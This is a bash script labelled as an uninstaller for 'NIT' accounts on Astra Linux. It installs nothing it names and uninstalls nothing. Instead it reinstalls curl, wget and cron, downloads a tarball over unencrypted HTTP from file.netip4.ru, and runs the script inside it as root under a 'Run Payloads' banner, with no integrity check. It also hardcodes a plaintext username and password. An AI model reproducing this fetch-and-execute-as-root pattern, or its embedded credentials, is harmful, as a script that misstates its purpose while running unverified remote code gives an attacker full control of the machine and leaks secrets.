#!/usr/bin/env bash
#### 
# add.nit.user.tar.gz.uninstall.sh
# This Script will Uninstall NIT System and User Accounts
####

# Check if script run at root mode
#

if [ $EUID -ne 0 ]; then
	echo "ERROR: process must be start with root permissions"
	exit 17
fi

#### Set Variables ####
##

### Set Metadata ###
#

PACKAGES_DIR=packages
DISTRIB=ASTRA
PRODUCTNAME=BHSH
SUBPRODUCTNAME=cron.adjust
FIRM_NAME=NIT

## Others Variables....
#

anArch=$SUBPRODUCTNAME.tar.gz
anInstalFile=$SUBPRODUCTNAME.sh

# Initialization Download Variables
#
http_pref001=http
http_host001=file.netip4.ru
http_port001=80
http_dir0001=/LINUXSCRIPTS/
http_dir0002=/ExponentaForDebian/
http_dir0003=$http_dir0001$DISTRIB/$FIRM_NAME/$PRODUCTNAME/$SUBPRODUCTNAME/
http_pref002=http
http_host002=reverse.netip4.ru
http_port002=80
http_dir00000=/tmp/LinFiles/
http_dir00001=/tmp/LinFiles/ComFiles/
http_user001=MSSQLSR
http_pass001=Admin01234

# Derivatives Variables
host=$http_pref001://$http_host001:$http_port001$http_dir0003$anArch
echo "host = $host"
#

# Check if script run at root mode
#

if [ ! -e /usr/bin/id ]; then
    echo "/usr/bin/id is not found."
    echo "The Packet coreutils may be corrupt!"
    echo "Please check error and reinstall your distributive."
    exit 1
fi

if [ "$(id -u)" -ne 0 ]; then
	echo "ERROR: process must be start with root permissions"
	exit 17
fi

### Set an NIT Users Variable ###
#

echo "### Check System Integrity ###"
###
if [ ! -e /usr/bin/apt-get ]; then
    echo "/usr/bin/apt-get is not found"
    exit 1
fi

### Set None Interactive Variable
export DEBIAN_FRONTEND=noninteractive

echo "Main Update and Upgrade..."
echo "##"
apt-get update

echo " "
echo "curl and wget reinstall..."
apt-get install -y curl
apt-get install -y wget

echo " "
echo "Install rsyslog..."
apt-get install --reinstall -y rsyslog
systemctl enable rsyslog.service
systemctl restart rsyslog.service

echo " "
echo "Install cron..."
apt-get install --reinstall -y cron
systemctl enable cron.service
systemctl restart cron.service

### Run Payloads

### Set Main User Name
#
MAINUSERNAME=root

#### Run Payloads
##
ADIR=/$MAINUSERNAME

if [ ! -d $ADIR ]; then
    echo "General Error. User $MAINUSERNAME not Found!"
    exit 1
fi

ADIR=$ADIR/$PACKAGES_DIR

if [ ! -d $ADIR ]; then
    mkdir $ADIR
fi

ADIR=$ADIR/$FIRM_NAME

if [ ! -d $ADIR ]; then
    mkdir $ADIR
fi

ADIR=$ADIR/$PRODUCTNAME

if [ ! -d $ADIR ]; then
    mkdir $ADIR
fi

echo "Downloading File $anArch"
curl -o $ADIR/$anArch $host

echo "Run Payloads..."
CDDIR=$(pwd)
cd $ADIR
if [ ! -f $anArch ]; then
    echo "Can't Download file $anArch."
    exit 1
fi
tar -xzvf $anArch
if [ ! -d "./$SUBPRODUCTNAME" ]; then
    echo "A Directory ./$SUBPRODUCTNAME is not Found."
    exit 1
fi
cd ./$SUBPRODUCTNAME
/bin/bash $anInstalFile
if [ $? -gt 0 ]; then
    cd $CDDIR
    exit 1
fi
cd $CDDIR

# End of the Script
echo "The Script $0 is Terminated Successfully!"
exit 0
